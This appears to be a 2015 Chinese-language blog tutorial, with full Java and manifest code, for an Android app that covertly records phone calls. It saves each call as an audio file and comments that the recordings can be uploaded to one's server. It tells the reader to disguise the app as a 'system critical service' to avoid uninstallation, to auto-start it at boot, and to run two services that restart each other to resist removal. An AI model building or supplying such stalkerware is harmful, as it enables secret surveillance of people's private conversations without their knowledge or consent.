---
title: 安卓通话窃听测试
date: 2015-11-08 19:34:06
tags: android
---

### 1.新建类PhonelistenService继承自Service类 ###

```java
package com.amy.phonelistener;  
  
import java.io.File;  
import android.app.Service;  
import android.content.Intent;  
import android.media.MediaRecorder;  
import android.os.Environment;  
import android.os.IBinder;  
import android.telephony.PhoneStateListener;  
import android.telephony.TelephonyManager;  
import android.util.Log;  
  
public class PhonelistenService extends Service {  
    private static String TAG = "PhonelistenService";  
    private TelephonyManager tm ;  
    private PhoneStateListener listener ;  
    @Override  
    public IBinder onBind(Intent intent) {  
        return null;  
    }  
    @Override  
    public void onCreate() {  
        tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);//通过系统API拿到TelephonyManager  
        tm.listen(listener = new PhoneStateListener(){  
            private MediaRecorder recorder = null;  
          
  
            @Override  
            public void onCallStateChanged(int state, String incomingNumber) {  
                System.out.println("onCallStateChanged() InComeing:"+incomingNumber);  
                switch (state) {  
                case TelephonyManager.CALL_STATE_OFFHOOK://通话状态  
                    //实例化录音机  
                    recorder = new MediaRecorder();   
                    //设置声音源  
                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);  
                    //设置文件输出格式  
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);  
                    //指定录音文件名称  
                    File file = new File(Environment.getExternalStorageDirectory(),System.currentTimeMillis()+".mp3");  
                    recorder.setOutputFile(file.getAbsolutePath());  
                      
                    //设置编码格式  
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);  
                    try {  
                        recorder.prepare();  
                    } catch (Exception e) {  
                        e.printStackTrace();  
                        Log.i(TAG, "recorder 初始化失败");  
                    }  
                    recorder.start();  
                    break;  
                case TelephonyManager.CALL_STATE_IDLE://一般状态  
                    if(recorder != null){  
                        recorder.stop();//停止录制  
                        recorder.release();//释放资源  
                        recorder = null;  
                        Log.i(TAG, "录制完毕！上传至服务器");//在这里可以将你的录音文件上传在至你的服务器  
                    }  
                    break;  
                case TelephonyManager.CALL_STATE_RINGING://响铃状态  
                    break;  
  
                default:  
                    break;  
                }  
                super.onCallStateChanged(state, incomingNumber);  
            }  
        }, PhoneStateListener.LISTEN_CALL_STATE);  
        super.onCreate();  
    }  
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
    }  
  
}  
```

<!--more-->
### 2.添加权限 ###

```xml
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>  
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>  
<uses-permission android:name="android.permission.RECORD_AUDIO"/>  
```

### 3.让程序更加健壮 ###
你的程序写出来。用户可以在应用管理里找到。一看是电话窃听器自然就卸载了。所以你可以吧程序名称改成“系统关键服务”，还有，要是用户不打开这个程序，那么这服务就没用。你可以添加一个广播接收者。接收开机完成的消息。一旦开机，就开启这个服务。

```java
package com.amy.phonelistener;  
  
import android.content.BroadcastReceiver;  
import android.content.Context;  
import android.content.Intent;  
import android.sax.StartElementListener;  
  
public class BootReceiver extends BroadcastReceiver {  
  
    @Override  
    public void onReceive(Context context, Intent intent) {  
        Intent i = new Intent(context,PhonelistenService.class);  
        context.startService(i);  
    }  
  
}  
```

### 4.配置清单文件 ###

```xml
<receiver android:name="com.amy.phonelistener.BootReceiver">  
   <intent-filter >  
       <action android:name="android.intent.action.BOOT_COMPLETED"/>  
   </intent-filter>  
</receiver> 
```

要是你觉得这还不够，你可以写的更流氓一点，
写两个相同服务。当一个销毁的时候开启另一个。
在PhonelistenService 的onDestory方法里添加如下代码。

```java
@Override  
public void onDestroy() {  

    Intent intent = new Intent(this,OtherPhonelistenService.class);  
    startService(intent);  
    super.onDestroy();  
}  
```

这样两个服务相互守护。当然作为一个 好的程序猿是不会写这样的代码的。

要是取消监听可以这样写:

```java
tm.listen(listener, PhoneStateListener.LISTEN_NONE);  
```

